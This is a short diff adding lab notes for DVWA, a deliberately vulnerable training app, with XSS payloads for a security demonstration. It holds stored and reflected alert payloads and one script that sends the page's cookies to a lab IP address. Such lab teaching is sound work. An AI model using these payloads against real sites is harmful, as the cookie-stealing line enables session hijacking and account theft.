@@ -1,0 +1,6 @@
+-- XSS payloads (lab-only)
+<script>alert('XSS Stored')</script>          -- Stored XSS test
+<script>fetch('http://192.168.56.1:8000/?c='+document.cookie)</script>  -- exfiltrate cookie (lab only)
+"><script>alert('reflected')</script>        -- reflected XSS via parameter
+
+Notes: Use DVWA XSS pages with security=low. Show the alert to demonstrate execution, then show mitigation.
